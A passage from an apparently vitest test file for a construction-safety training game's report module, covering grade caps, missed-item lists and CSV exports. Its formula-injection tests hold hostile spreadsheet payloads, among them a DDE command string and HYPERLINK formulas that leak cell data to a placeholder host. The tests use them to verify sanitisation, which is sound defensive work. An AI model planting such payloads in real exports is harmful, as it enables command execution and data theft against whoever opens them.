import { afterEach, describe, expect, it, vi } from 'vitest'
import {
  DECISION_LOG_HEADERS, SERIOUS_FAILURE_GRADE_CAP, SHUTDOWN_GRADE_CAP, allDecisionSteps, buildMissedItems,
  buildScoreReport, decisionsCsv, displayName, downloadText, environmentalChecklistCsv, environmentalDecisions,
  exportName, finalOverall, findSteps, gradeCap, gradeCapNote, inspectionTrackerCsv, isEnvironmentalDecision,
  isInspectionTopic, isLegalDecision, isProgrammeDecision, permitTrackerCsv, rawOverall, seriousOutcomes, toCsv,
  twRegisterCsv,
} from './reports'
import { gradeFor, overallScore, zeroScores } from './scoring'
import { SCENARIOS } from '../data'
import type {
  ConsequenceRecord, DecisionRecord, DecisionStep, GameState, NoticeRecord, PermitStep, Scenario, ScoreKey, TwRegisterStep,
} from '../types'
import { GRADE_BANDS, SCORE_KEYS } from '../types'
import { DIFFS, S1, S3, decisionStep, option, stateFor } from '../test/fixtures'
import { perfectStrategy, play, recklessStrategy } from '../test/playthrough'

/** Minimal RFC 4180 reader (quoted fields, doubled quotes, CRLF records) for round-trip checks. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = []
  let row: string[] = []
  let cell = ''
  let quoted = false
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') { cell += '"'; i++ }
      else if (ch === '"') quoted = false
      else cell += ch
    } else if (ch === '"' && cell === '') quoted = true
    else if (ch === ',') { row.push(cell); cell = '' }
    else if (ch === '\r' && text[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; i++ }
    else if (ch === '\n' || ch === '\r') { row.push(cell); rows.push(row); row = []; cell = '' } // bare CR or LF: what Excel does
    else cell += ch
  }
  row.push(cell)
  rows.push(row)
  return rows
}

const scoresAt = (pct: number): GameState['scores'] => ({
  earned: Object.fromEntries(SCORE_KEYS.map((k) => [k, pct])) as Record<ScoreKey, number>,
  possible: Object.fromEntries(SCORE_KEYS.map((k) => [k, 100])) as Record<ScoreKey, number>,
  meters: { clientConfidence: 70, morale: 70, enforcementRisk: 15, incidentLikelihood: 15, cost: 30 },
})

// ---------------------------------------------------------------------------
// finalOverall
// ---------------------------------------------------------------------------

describe('finalOverall', () => {
  it('is the plain competence score when the project was not shut down', () => {
    for (const pct of [0, 39, 40, 74, 93, 100]) {
      const s = stateFor(S1, 'standard', {}, {}, { scores: scoresAt(pct) })
      expect(finalOverall(s)).toBe(pct)
      expect(finalOverall(s)).toBe(overallScore(s.scores))
    }
  })

  it('an HSE shutdown caps the score at 39, i.e. the "Unsafe planning" band', () => {
    for (const pct of [40, 60, 93, 100]) {
      const s = stateFor(S1, 'expert', { shutdown: true }, {}, { scores: scoresAt(pct) })
      expect(finalOverall(s)).toBe(39)
      expect(gradeFor(finalOverall(s)).label).toBe('Unsafe planning')
    }
  })

  it('the cap never raises a score that was already below it', () => {
    for (const pct of [0, 12, 39]) {
      expect(finalOverall(stateFor(S1, 'expert', { shutdown: true }, {}, { scores: scoresAt(pct) }))).toBe(pct)
    }
  })

  it('tolerates a save from before the game layer existed', () => {
    const legacy = { ...stateFor(S1, 'standard', {}, {}, { scores: scoresAt(80) }), game: undefined } as unknown as GameState
    expect(finalOverall(legacy)).toBe(80)
    expect(gradeCap(legacy)).toBeNull()
    expect(seriousOutcomes(legacy)).toEqual({ criticalFailures: 0, riddor: 0, prohibitions: 0, notices: 0, shutdown: false })
  })
})

// ---------------------------------------------------------------------------
// Grade caps for serious outcomes
// ---------------------------------------------------------------------------

describe('grade caps: serious outcomes limit the grade whatever the marks', () => {
  const incident = (over: Partial<ConsequenceRecord> = {}): ConsequenceRecord => ({
    hazardId: 'h', week: 6, severity: 'major', title: 'Serious incident', narrative: 'n', rootCause: 'r', cost: 15000, days: 4, riddor: false, points: -400, ...over,
  })
  const notice = (kind: NoticeRecord['kind']): NoticeRecord => ({ kind, week: 8, reason: 'r', cost: 3000, days: 2, points: -250 })
  const run = (pct: number, game: Parameters<typeof stateFor>[2] = {}, over: Partial<GameState> = {}) =>
    stateFor(S1, 'learner', game, {}, { scores: scoresAt(pct), ...over })

  it('the caps sit at the top of the bottom band and one point short of the top band', () => {
    expect(SHUTDOWN_GRADE_CAP).toBe(39)
    expect(SERIOUS_FAILURE_GRADE_CAP).toBe(89)
    expect(gradeFor(SHUTDOWN_GRADE_CAP)).toBe(GRADE_BANDS.at(-1))
    expect(gradeFor(SHUTDOWN_GRADE_CAP + 1)).not.toBe(GRADE_BANDS.at(-1))
    expect(gradeFor(SERIOUS_FAILURE_GRADE_CAP)).toBe(GRADE_BANDS[1])
    expect(gradeFor(SERIOUS_FAILURE_GRADE_CAP + 1)).toBe(GRADE_BANDS[0])
  })

  it('a clean run has no cap', () => {
    const s = run(96)
    expect(gradeCap(s)).toBeNull()
    expect(gradeCapNote(s)).toBeNull()
    expect(finalOverall(s)).toBe(96)
  })

  it('any critical safety failure means the run cannot grade above "Good"', () => {
    for (const pct of [90, 96, 100]) {
      const s = run(pct, {}, { criticalFailures: ['Lift carried out with no lift plan'] })
      expect(finalOverall(s)).toBe(89)
      expect(gradeFor(finalOverall(s)).label).toBe('Good')
      expect(rawOverall(s)).toBe(pct)
    }
    expect(gradeCap(run(100, {}, { criticalFailures: ['a'] }))).toEqual({
      cap: 89, bandLabel: 'Good', reason: 'the run recorded 1 critical safety failure',
    })
  })

  it('a prohibition notice or a RIDDOR-reportable incident means the run cannot grade "Excellent"', () => {
    const prohibited = run(97, { notices: [notice('prohibition')] })
    expect(finalOverall(prohibited)).toBe(89)
    expect(gradeFor(finalOverall(prohibited)).label).not.toBe('Excellent')
    expect(gradeCap(prohibited)?.reason).toBe('the run recorded 1 HSE prohibition notice')

    const riddor = run(97, { consequences: [incident({ riddor: true }), incident({ riddor: true }), incident()] })
    expect(finalOverall(riddor)).toBe(89)
    expect(gradeCap(riddor)?.reason).toBe('the run recorded 2 RIDDOR-reportable incidents')
  })

  it('an improvement notice or an incident that is not RIDDOR-reportable does not cap the grade by itself', () => {
    const s = run(95, { notices: [notice('improvement')], consequences: [incident(), incident({ severity: 'minor' })] })
    expect(gradeCap(s)).toBeNull()
    expect(finalOverall(s)).toBe(95)
    expect(seriousOutcomes(s)).toEqual({ criticalFailures: 0, riddor: 0, prohibitions: 0, notices: 1, shutdown: false })
  })

  it('the reason lists everything that was recorded, in plain English', () => {
    const s = run(100, { notices: [notice('prohibition'), notice('improvement'), notice('prohibition')], consequences: [incident({ riddor: true })] }, { criticalFailures: ['a', 'b', 'c'] })
    expect(gradeCap(s)?.reason).toBe('the run recorded 3 critical safety failures, 2 HSE prohibition notices and 1 RIDDOR-reportable incident')
    expect(gradeCapNote(s)).toBe(
      'Grade capped at 89 (Good) because the run recorded 3 critical safety failures, 2 HSE prohibition notices and 1 RIDDOR-reportable incident. The answers alone scored 100/100.',
    )
  })

  it('a cap never raises a score, and says nothing when it made no difference', () => {
    for (const pct of [0, 45, 74, 89]) {
      const s = run(pct, { notices: [notice('prohibition')] }, { criticalFailures: ['a'] })
      expect(finalOverall(s)).toBe(pct)
      expect(gradeCap(s)?.cap).toBe(89)
      expect(gradeCapNote(s)).toBeNull()
      expect(buildScoreReport(s, S1).capReason).toBeNull()
    }
  })

  it('a shutdown is the lower cap and takes precedence over the others', () => {
    const s = run(98, { shutdown: true, notices: [notice('prohibition')], consequences: [incident({ riddor: true })] }, { criticalFailures: ['a'] })
    expect(finalOverall(s)).toBe(39)
    expect(gradeCap(s)).toEqual({ cap: 39, bandLabel: 'Unsafe planning', reason: 'the project was shut down by an HSE prohibition notice' })
    expect(gradeCapNote(s)).toBe('Grade capped at 39 (Unsafe planning) because the project was shut down by an HSE prohibition notice. The answers alone scored 98/100.')
  })

  it('the score report carries the capped grade, the raw score, the cap and the reason to print', () => {
    const s = run(94, { consequences: [incident({ riddor: true })] }, { criticalFailures: ['Out-of-sequence work'] })
    const report = buildScoreReport(s, S1)
    expect(report.overall).toBe(89)
    expect(report.rawOverall).toBe(94)
    expect(report.cap).toBe(89)
    expect(report.gradeLabel).toBe('Good')
    expect(report.capReason).toBe('Grade capped at 89 (Good) because the run recorded 1 critical safety failure and 1 RIDDOR-reportable incident. The answers alone scored 94/100.')
    expect(report.outcome).toEqual({ criticalFailures: 1, riddor: 1, prohibitions: 0, notices: 0, shutdown: false })
    const clean = buildScoreReport(run(94), S1)
    expect(clean).toMatchObject({ overall: 94, rawOverall: 94, cap: null, capReason: null, gradeLabel: 'Excellent' })
  })

  it('in real play: a model run with one answer that is a critical failure is held to "Good" on every scenario', () => {
    for (const scenario of SCENARIOS) {
      let used = ''
      const { final } = play(scenario, 'learner', 11, {
        ...perfectStrategy,
        decision: (step, state) => {
          const critical = step.options.find((o) => o.criticalFailure)
          if (!used && critical) { used = step.id; return { option: critical, confidence: 'sure', timeFrac: null } }
          return perfectStrategy.decision(step, state)
        },
      })
      expect(used, scenario.id).not.toBe('')
      expect(final.criticalFailures.length).toBeGreaterThan(0)
      expect(rawOverall(final), scenario.id).toBeGreaterThanOrEqual(90)
      expect(finalOverall(final), scenario.id).toBe(89)
      expect(buildScoreReport(final, scenario).gradeLabel).toBe('Good')
    }
  })
})

// ---------------------------------------------------------------------------
// Step lookups
// ---------------------------------------------------------------------------

describe('findSteps / allDecisionSteps', () => {
  it('finds steps by type across all phases, in phase order', () => {
    for (const s of SCENARIOS) {
      expect(findSteps<PermitStep>(s, 'permits')).toHaveLength(1)
      expect(findSteps<TwRegisterStep>(s, 'twRegister')).toHaveLength(1)
      expect(findSteps(s, 'sequence')).toHaveLength(2)
      expect(findSteps(s, 'hazardHunt')).toHaveLength(1)
      expect(findSteps(s, 'nonsense')).toEqual([])
    }
  })

  it('allDecisionSteps includes the incident pool and has unique ids across the scenario', () => {
    for (const s of SCENARIOS) {
      const all = allDecisionSteps(s)
      expect(all).toHaveLength(findSteps<DecisionStep>(s, 'decision').length + s.eventPool.length)
      expect(new Set(all.map((d) => d.id)).size).toBe(all.length)
    }
  })
})

// ---------------------------------------------------------------------------
// Missed items and the score report
// ---------------------------------------------------------------------------

describe('buildMissedItems / buildScoreReport', () => {
  for (const scenario of SCENARIOS) {
    it(`${scenario.id}: a model run has nothing in any "missed" list`, () => {
      const { final } = play(scenario, 'standard', 11, perfectStrategy)
      const missed = buildMissedItems(final, scenario)
      for (const [key, list] of Object.entries(missed)) expect(list, key).toEqual([])
    })

    it(`${scenario.id}: a reckless run is itemised: failures, permits, TW, placements, hazards and sequence errors`, () => {
      const { final } = play(scenario, 'learner', 11, recklessStrategy)
      const missed = buildMissedItems(final, scenario)
      expect(missed.criticalFailures).toEqual(final.criticalFailures)
      expect(missed.criticalFailures.length).toBeGreaterThan(0)
      const permits = findSteps<PermitStep>(scenario, 'permits')[0]
      expect(missed.missedPermits).toEqual(permits.required.map((id) => permits.options.find((o) => o.id === id)!.name))
      const genuineTw = findSteps<TwRegisterStep>(scenario, 'twRegister')[0].items.filter((i) => i.correct.register).map((i) => i.name)
      expect(missed.missedTwItems).toEqual(expect.arrayContaining(genuineTw))
      expect(missed.missedHazards).toHaveLength(8)
      expect(missed.missingPlacements.length).toBeGreaterThan(0)
      expect(missed.unsafePlacements).toEqual([])
      expect(missed.sequenceErrors.some((e) => e.startsWith('CRITICAL: '))).toBe(true)
      expect(missed.programmeConsequences.length).toBeGreaterThan(0)
      expect(missed.revisionTopics).toEqual([...new Set(missed.revisionTopics)].sort())
      expect(missed.revisionTopics.length).toBeGreaterThan(5)
    })
  }

  it('an item wrongly ADDED to the TW register is listed as over-registered, not as "missed" (eng-tests-11)', () => {
    // Scenario 3: the portable signals power supply is not temporary works (correct.register === false).
    const notTw = findSteps<TwRegisterStep>(S3, 'twRegister')[0].items.find((i) => !i.correct.register)!
    expect(notTw.id).toBe('tw3-signals-power')
    const { final } = play(S3, 'standard', 11, perfectStrategy)
    const overRegistered = { ...final, twAnswers: final.twAnswers.map((a) => (a.itemId === notTw.id ? { ...a, register: true } : a)) }
    const missed = buildMissedItems(overRegistered, S3)
    expect(missed.missedTwItems).toEqual([])
    expect(missed.overRegisteredTwItems).toEqual([`${notTw.name} — added to the register, but it is not temporary works`])
    // Leaving the question unanswered is not over-registering.
    const blank = { ...final, twAnswers: final.twAnswers.map((a) => (a.itemId === notTw.id ? { itemId: a.itemId } : a)) }
    expect(buildMissedItems(blank, S3).overRegisteredTwItems).toEqual([])
    expect(buildMissedItems(blank, S3).missedTwItems).toEqual([])
  })

  it('an inspection ticked for an item that does not need one is not reported as a missed inspection', () => {
    const { final } = play(S1, 'standard', 11, perfectStrategy)
    const items = findSteps<TwRegisterStep>(S1, 'twRegister')[0].items
    const needs = items.find((i) => i.correct.inspection)!
    const scenario: Scenario = {
      ...S1,
      phases: S1.phases.map((p) => ({
        ...p,
        steps: p.steps.map((st) => (st.type === 'twRegister'
          ? { ...st, items: st.items.map((i) => (i.id === needs.id ? { ...i, correct: { ...i.correct, inspection: false } } : i)) }
          : st)),
      })),
    }
    // The delegate said "inspect before use" for an item whose (altered) model answer is "no".
    expect(buildMissedItems(final, scenario).missedInspections).toEqual([])
    const skipped = { ...final, twAnswers: final.twAnswers.map((a) => (a.itemId === needs.id ? { ...a, inspection: false } : a)) }
    expect(buildMissedItems(skipped, S1).missedInspections).toEqual([`${needs.name} — pre-use inspection/permit`])
  })

  it('permits raised that the work did not need are reported, separately from missed permits', () => {
    for (const scenario of SCENARIOS) {
      const step = findSteps<PermitStep>(scenario, 'permits')[0]
      const { final } = play(scenario, 'standard', 11, perfectStrategy)
      const padded = { ...final, permitAnswers: [{ stepId: step.id, selected: step.options.map((o) => o.id) }] }
      const missed = buildMissedItems(padded, scenario)
      expect(missed.missedPermits).toEqual([])
      expect(missed.unnecessaryPermits).toEqual(step.options.filter((o) => !step.required.includes(o.id)).map((o) => o.name))
    }
  })

  describe('the legal, environmental and programme lists follow what the model answer is marked for, not the topic label (eng-reports-privacy-6)', () => {
    // Topic labels chosen so that no keyword can match: only the marks can classify these.
    const legalStep = decisionStep({
      id: 'fx-legal', topic: 'Street works — telling the authority first',
      options: [option('best', { impact: { legal: 10, planning: 6 } }), option('unsafe', { impact: { safety: -2 } })],
    })
    const safetyStep = decisionStep({
      id: 'fx-safety', topic: 'Edge protection on the slab',
      options: [option('best', { impact: { safety: 10, legal: 4 } }), option('poor', { impact: { safety: 1 } }), option('unsafe', { id: 'breach', impact: { safety: -5, legal: -6 } })],
    })
    const envStep = decisionStep({
      id: 'fx-env', topic: 'Pumping out the trench',
      options: [option('best', { impact: { safety: 8, environment: 6 } }), option('poor', { impact: { safety: 2 } })],
    })
    const progStep = decisionStep({
      id: 'fx-prog', topic: 'Recovering two lost weeks',
      options: [option('best', { impact: { safety: 5, programme: 10 } }), option('poor', { impact: { safety: 1 } })],
    })
    const scenario: Scenario = {
      ...S1,
      phases: [{ id: 'fx-phase', number: 5, title: 'Fixture', intro: '', steps: [legalStep, safetyStep, envStep, progStep] }],
      eventPool: [],
    }
    const answered = (step: DecisionStep, optionId: string, over: Partial<DecisionRecord> = {}): DecisionRecord => {
      const chosen = step.options.find((o) => o.id === optionId)
      return { stepId: step.id, phaseNumber: 5, prompt: step.prompt, topic: step.topic, chosenOptionId: optionId, quality: chosen?.quality ?? 'poor', wasEvent: false, ...over }
    }
    const missedFor = (...decisions: DecisionRecord[]) => buildMissedItems(stateFor(scenario, 'standard', {}, {}, { decisions }), scenario)

    it('a statutory duty with no legal keyword in its topic is still a missed legal duty', () => {
      expect(isLegalDecision(legalStep.topic)).toBe(false)
      expect(isLegalDecision(legalStep.topic, legalStep)).toBe(true)
      expect(missedFor(answered(legalStep, 'opt-unsafe')).missedLegalDuties).toEqual([legalStep.topic])
    })

    it('a safety question is a legal miss only when the answer chosen itself loses legal marks', () => {
      expect(isLegalDecision(safetyStep.topic, safetyStep)).toBe(false)
      expect(missedFor(answered(safetyStep, 'opt-poor')).missedLegalDuties).toEqual([])
      expect(missedFor(answered(safetyStep, 'breach')).missedLegalDuties).toEqual([safetyStep.topic])
    })

    it('an environmental question is recognised by its Environmental Control marks', () => {
      expect(isEnvironmentalDecision(envStep.topic)).toBe(false)
      expect(isEnvironmentalDecision(envStep.topic, envStep)).toBe(true)
      expect(missedFor(answered(envStep, 'opt-poor')).environmentalFailures).toEqual([envStep.topic])
      expect(missedFor(answered(safetyStep, 'opt-poor')).environmentalFailures).toEqual([])
    })

    it('when the step is known the marks decide, so a fire-escape question that mentions waste is not environmental', () => {
      const fire = decisionStep({ id: 'fx-fire', topic: 'Fire escape routes and site waste logistics', options: [option('best', { impact: { safety: 10 } }), option('poor')] })
      expect(isEnvironmentalDecision(fire.topic)).toBe(true) // topic wording alone (tutor questions, old saves)
      expect(isEnvironmentalDecision(fire.topic, fire)).toBe(false)
    })

    it('a programme question is recognised by programme marks leading the model answer, or by its topic', () => {
      expect(isProgrammeDecision(progStep.topic, progStep)).toBe(true)
      expect(isProgrammeDecision(safetyStep.topic, safetyStep)).toBe(false)
      expect(isProgrammeDecision('Programme pressure and safe recovery planning')).toBe(true)
      expect(missedFor(answered(progStep, 'opt-poor')).programmeConsequences).toEqual([progStep.topic])
    })

    it('a timed-out question is classified by its model answer; partial answers are revision topics only', () => {
      const timedOut = missedFor(answered(legalStep, 'timeout', { quality: 'poor', timedOut: true }))
      expect(timedOut.missedLegalDuties).toEqual([legalStep.topic])
      const partial = missedFor(answered(legalStep, 'x', { quality: 'partial' }), answered(envStep, 'x', { quality: 'partial' }))
      expect(partial.missedLegalDuties).toEqual([])
      expect(partial.environmentalFailures).toEqual([])
      expect(partial.revisionTopics).toEqual([envStep.topic, legalStep.topic].sort())
    })

    it('nothing is listed twice, and best answers are never listed', () => {
      const m = missedFor(answered(legalStep, 'opt-unsafe'), answered(legalStep, 'opt-unsafe'), answered(envStep, 'opt-best', { quality: 'best' }))
      expect(m.missedLegalDuties).toEqual([legalStep.topic])
      expect(m.environmentalFailures).toEqual([])
    })

    it('topic wording still works for questions the scenario does not contain (tutor questions)', () => {
      const custom = (topic: string): DecisionRecord => ({ stepId: 'custom-1', phaseNumber: 3, prompt: 'Q', topic, chosenOptionId: 'x', quality: 'poor', wasEvent: false })
      expect(missedFor(custom('CDM 2015 — notification')).missedLegalDuties).toEqual(['CDM 2015 — notification'])
      expect(missedFor(custom('RIDDOR — reporting')).missedLegalDuties).toEqual(['RIDDOR — reporting'])
      expect(missedFor(custom('Statutory duties of the principal contractor')).missedLegalDuties).toHaveLength(1)
      expect(missedFor(custom('Silt pollution')).environmentalFailures).toEqual(['Silt pollution'])
      expect(missedFor(custom('Scaffold inspection')).missedInspections).toEqual(['Scaffold inspection'])
      expect(isInspectionTopic('Plant and lifting equipment — thorough examination')).toBe(true)
      expect(missedFor(custom('Tutor question')).missedLegalDuties).toEqual([])
    })

    it('in the shipped scenarios an unsafe answer to any question whose model answer leads on legal marks is a missed legal duty', () => {
      for (const real of SCENARIOS) {
        const statutory = allDecisionSteps(real).filter((d) => {
          const best = d.options.find((o) => o.quality === 'best')!
          const legal = best.impact.legal ?? 0
          return legal > 0 && SCORE_KEYS.every((k) => (best.impact[k] ?? 0) <= legal)
        })
        expect(statutory.length, real.id).toBeGreaterThan(5)
        for (const d of statutory) {
          const worst = d.options.find((o) => o.quality === 'unsafe') ?? d.options.find((o) => o.quality === 'poor')!
          const m = buildMissedItems(stateFor(real, 'standard', {}, {}, { decisions: [answered(d, worst.id)] }), real)
          expect(m.missedLegalDuties, `${real.id} ${d.id}`).toEqual([d.topic])
        }
      }
    })
  })

  it('reports show the team name when a team is playing, and the delegate name otherwise', () => {
    const solo = stateFor(S1, 'standard', {}, {}, { delegateName: '  Priya  ' })
    expect(displayName(solo)).toBe('Priya')
    expect(buildScoreReport(solo, S1)).toMatchObject({ delegateName: 'Priya', teamName: null, teamMembers: [] })
    const team = stateFor(S1, 'expert', {}, {}, { delegateName: 'Priya', team: { name: 'Team Kestrel', members: ['Priya', 'Tom', 'Aisha'], roles: {} } })
    expect(displayName(team)).toBe('Team Kestrel')
    expect(buildScoreReport(team, S1)).toMatchObject({
      delegateName: 'Team Kestrel', teamName: 'Team Kestrel', teamMembers: ['Priya', 'Tom', 'Aisha'], difficulty: 'expert', difficultyLabel: 'Expert',
    })
    expect(displayName({ delegateName: '', team: { name: '  ', members: [], roles: {} } })).toBe('Delegate')
    expect(displayName({ delegateName: '', team: null })).toBe('Delegate')
  })

  it('builds the headline report: seven categories, overall, grade and a fallback delegate name', () => {
    const { final } = play(S1, 'standard', 3, perfectStrategy, '')
    const report = buildScoreReport(final, S1)
    expect(report.delegateName).toBe('Delegate')
    expect(report.scenarioTitle).toBe(S1.title)
    expect(report.categories.map((c) => c.key)).toEqual(SCORE_KEYS)
    expect(report.overall).toBe(finalOverall(final))
    expect(report.gradeLabel).toBe(gradeFor(report.overall).label)
    expect(report.startedAt).toBe(final.startedAt)
    expect(report.finishedAt).toBe(final.finishedAt)
    expect(buildScoreReport({ ...final, delegateName: 'Group 3' }, S1).delegateName).toBe('Group 3')
  })

  it('a shut-down project is reported in the capped band with the shutdown called out', () => {
    const { final } = play(S1, 'expert', 12345, recklessStrategy)
    expect(final.game.shutdown).toBe(true)
    const report = buildScoreReport(final, S1)
    expect(report.overall).toBeLessThanOrEqual(39)
    expect(report.gradeLabel).toBe('Unsafe planning')
    expect(report.missed.programmeConsequences).toContain('Project shut down by an HSE prohibition notice.')
  })
})

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------

describe('toCsv', () => {
  it('joins cells with commas and records with CRLF, with no trailing newline', () => {
    expect(toCsv(['A', 'B'], [['1', '2'], ['3', '4']])).toBe('A,B\r\n1,2\r\n3,4')
    expect(toCsv(['A'], [])).toBe('A')
  })

  it('renders numbers, booleans, null and undefined', () => {
    expect(toCsv(['n', 'b', 'x', 'y', 'z'], [[1.5, false, null, undefined, 0]])).toBe('n,b,x,y,z\r\n1.5,false,,,0')
  })

  it('quotes cells containing a comma, a double quote or a line feed, doubling embedded quotes', () => {
    expect(toCsv(['h'], [['a,b']])).toBe('h\r\n"a,b"')
    expect(toCsv(['h'], [['say "stop"']])).toBe('h\r\n"say ""stop"""')
    expect(toCsv(['h'], [['line1\nline2']])).toBe('h\r\n"line1\nline2"')
    expect(toCsv(['a,b'], [])).toBe('"a,b"')
  })

  it('leaves ordinary text, £ signs and em dashes unquoted and unchanged', () => {
    expect(toCsv(['h'], [['£1.4m — Small Commercial Extension']])).toBe('h\r\n£1.4m — Small Commercial Extension')
  })

  it('round-trips awkward real-world text through a standard CSV reader', () => {
    const nasty = [
      'plain', '', 'comma, inside', '"quoted"', 'ends with quote"', '"', '""', 'two\nlines', 'crlf\r\ninside',
      'CRITICAL: "Dig" must precede "Lift", always', ' leading and trailing ', '£12,000', 'emoji 🚧', ',', '\n',
    ]
    const rows = nasty.map((s, i) => [String(i), s, s])
    const parsed = parseCsv(toCsv(['i', 'a', 'b'], rows))
    expect(parsed).toEqual([['i', 'a', 'b'], ...rows])
  })

  it('a cell containing a bare carriage return is quoted (Excel treats CR as a new row) (eng-tests-6)', () => {
    const rows = [['1', 'first\rsecond', 'x']]
    expect(parseCsv(toCsv(['i', 'a', 'b'], rows))).toEqual([['i', 'a', 'b'], ...rows])
  })

  describe('formula injection (eng-tests-6, eng-reports-privacy-5)', () => {
    const payloads = [
      '=HYPERLINK("http://example.invalid","click")', '+1+1', '-2+3', '@SUM(A1:A2)', "=cmd|' /C calc'!A0",
      '\t=1+1', '\r=1+1', '  =1+1', ' @SUM(A1)', '\n=1+1', '-', '=',
    ]

    it.each(payloads.map((p) => [p]))('%j is written as text, not as a formula', (payload) => {
      const [, [cell]] = parseCsv(toCsv(['h'], [[payload]]))
      expect(cell).toBe(`'${payload}`)
      expect(cell).not.toMatch(/^\s*[=+\-@]/)
    })

    it('neutralises a header cell and every column, not only the first', () => {
      const parsed = parseCsv(toCsv(['=A1', 'ok'], [['Group 3', '=HYPERLINK("http://x.example?"&A2,"Top")', '@x']]))
      expect(parsed).toEqual([["'=A1", 'ok'], ['Group 3', '\'=HYPERLINK("http://x.example?"&A2,"Top")', "'@x"]])
    })

    it('leaves real numbers numeric, including negative points, and drops NaN and Infinity', () => {
      expect(toCsv(['pts'], [[-96], [0], [12.5], [Number.NaN], [Number.POSITIVE_INFINITY]])).toBe('pts\r\n-96\r\n0\r\n12.5\r\n\r\n')
    })

    it('leaves ordinary text that merely contains these characters alone', () => {
      const safe = ['a=b', 'Group A+B', 'mid-week', 'name@example.invalid', '£1.4m — extension', '—', 'Yes', '2 + 2']
      expect(parseCsv(toCsv(['h'], safe.map((v) => [v]))).slice(1).map((r) => r[0])).toEqual(safe)
    })

    it('a hostile delegate name, team name or tutor question cannot reach a spreadsheet as a formula', () => {
      const evil = '=HYPERLINK("http://x.example?"&E2,"Top")'
      const state = stateFor(S1, 'standard', {}, {}, {
        delegateName: evil,
        decisions: [{ stepId: 'custom-1', phaseNumber: 12, prompt: '=1+1 Who appoints the PC?', topic: '@Tutor question', chosenOptionId: 'x', quality: 'poor', wasEvent: true, confidence: 'sure', usedLifeline: false, points: -80, chosenText: '+The client', bestText: '-The HSE' }],
      })
      for (const who of [state, { ...state, team: { name: '@SUM(A1:A9)', members: [], roles: {} } }]) {
        const rows = parseCsv(decisionsCsv(who, S1))
        for (const cell of rows.flat()) expect(cell, cell).not.toMatch(/^\s*[=+@]|^\s*-(?!\d+$)/)
        expect(rows[1].at(-1)).toBe('-80')
      }
    })
  })
})

describe('CSV exports', () => {
  const final: Record<string, GameState> = {}
  const get = (id: string, kind: 'perfect' | 'reckless'): GameState => {
    const key = `${id}:${kind}`
    const scenario = SCENARIOS.find((s) => s.id === id)!
    final[key] ??= play(scenario, 'learner', 5, kind === 'perfect' ? perfectStrategy : recklessStrategy).final
    return final[key]
  }

  for (const scenario of SCENARIOS) {
    it(`${scenario.id}: every export is rectangular and survives a CSV reader`, () => {
      for (const kind of ['perfect', 'reckless'] as const) {
        const state = get(scenario.id, kind)
        const exports = [
          permitTrackerCsv(state, scenario), twRegisterCsv(state, scenario), inspectionTrackerCsv(state, scenario),
          decisionsCsv(state), decisionsCsv(state, scenario), environmentalChecklistCsv(state, scenario),
        ]
        for (const csv of exports) {
          const rows = parseCsv(csv)
          expect(rows.length).toBeGreaterThan(0)
          for (const r of rows) expect(r).toHaveLength(rows[0].length)
          expect(csv).not.toMatch(/undefined|NaN|\[object Object\]/)
        }
      }
    })

    it(`${scenario.id}: permit tracker lists every permit with the right status`, () => {
      const step = findSteps<PermitStep>(scenario, 'permits')[0]
      const perfect = parseCsv(permitTrackerCsv(get(scenario.id, 'perfect'), scenario))
      expect(perfect[0]).toEqual(['Permit', 'Required', 'Raised by delegate', 'Status'])
      expect(perfect).toHaveLength(step.options.length + 1)
      expect(perfect.slice(1).filter((r) => r[3] === 'In place')).toHaveLength(step.required.length)
      expect(perfect.slice(1).filter((r) => r[3] === 'MISSED')).toEqual([])
      const reckless = parseCsv(permitTrackerCsv(get(scenario.id, 'reckless'), scenario))
      expect(reckless.slice(1).filter((r) => r[3] === 'MISSED')).toHaveLength(step.required.length)
      const padded = { ...get(scenario.id, 'perfect'), permitAnswers: [{ stepId: step.id, selected: step.options.map((o) => o.id) }] }
      expect(parseCsv(permitTrackerCsv(padded, scenario)).filter((r) => r[3] === 'Raised (not essential)')).toHaveLength(step.options.length - step.required.length)
    })

    it(`${scenario.id}: TW register export marks a model answer "Correct" and an empty one for review`, () => {
      const items = findSteps<TwRegisterStep>(scenario, 'twRegister')[0].items
      const perfect = parseCsv(twRegisterCsv(get(scenario.id, 'perfect'), scenario))
      expect(perfect).toHaveLength(items.length + 1)
      expect(perfect.slice(1).every((r) => r.at(-1) === 'Correct')).toBe(true)
      const reckless = parseCsv(twRegisterCsv(get(scenario.id, 'reckless'), scenario))
      expect(reckless.slice(1).every((r) => r.at(-1)!.startsWith('Review: register; design;'))).toBe(true)
      expect(reckless.slice(1).every((r) => r[1] === '—')).toBe(true)
    })

    it(`${scenario.id}: inspection tracker flags a required inspection the delegate did not plan`, () => {
      const items = findSteps<TwRegisterStep>(scenario, 'twRegister')[0].items
      const need = items.filter((i) => i.correct.inspection).length
      const reckless = parseCsv(inspectionTrackerCsv(get(scenario.id, 'reckless'), scenario))
      expect(reckless.slice(1, items.length + 1).filter((r) => r[3] === 'MISSED')).toHaveLength(need)
      const perfect = parseCsv(inspectionTrackerCsv(get(scenario.id, 'perfect'), scenario))
      expect(perfect.slice(1).filter((r) => r[3] === 'MISSED' || r[3] === 'REVIEW')).toEqual([])
    })

    it(`${scenario.id}: decision log has one row per decision: who, where, the answer chosen, the model answer, outcome, wager and points`, () => {
      const state = get(scenario.id, 'perfect')
      const rows = parseCsv(decisionsCsv(state, scenario))
      expect(rows[0]).toEqual(DECISION_LOG_HEADERS)
      expect(rows[0]).toEqual([
        'Delegate or team', 'Scenario', 'Difficulty', 'Phase', 'Type', 'Prompt', 'Topic', 'Chosen answer', 'Model answer',
        'Outcome quality', 'Confidence', 'Lifeline used', 'Points',
      ])
      expect(rows).toHaveLength(state.decisions.length + 1)
      const steps = new Map(allDecisionSteps(scenario).map((d) => [d.id, d]))
      state.decisions.forEach((d, i) => {
        const model = steps.get(d.stepId)!.options.find((o) => o.quality === 'best')!.text
        expect(rows[i + 1]).toEqual([
          'Test Group', scenario.title, 'Learning', String(d.phaseNumber), d.wasEvent ? 'Event' : 'Decision', d.prompt, d.topic,
          model, model, 'best', 'sure', 'No', String(d.points),
        ])
      })
      // The reckless log shows the answer that was chosen next to the model answer.
      const reckless = get(scenario.id, 'reckless')
      const bad = parseCsv(decisionsCsv(reckless, scenario))
      reckless.decisions.forEach((d, i) => {
